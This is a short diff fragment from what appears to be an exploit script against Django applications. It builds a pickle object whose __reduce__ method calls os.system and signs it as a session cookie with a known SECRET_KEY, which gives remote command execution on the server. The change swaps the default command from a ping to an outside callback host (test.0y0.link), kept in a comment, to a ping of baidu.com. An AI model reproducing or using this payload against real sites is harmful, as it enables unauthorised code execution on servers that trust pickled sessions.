@@ -32,7 +32,7 @@ from django.contrib.sessions.serializers import PickleSerializer
 from django.core import signing
 import pickle
 
-def session_gen(SECRET_KEY,command = 'ping -n 3 test.0y0.link || ping -c test.0y0.link',):
+def session_gen(SECRET_KEY,command = 'ping -n 3 baidu.com',):
     class Run(object):
         def __reduce__(self):
             #return (os.system,('ping test.0y0.link',))
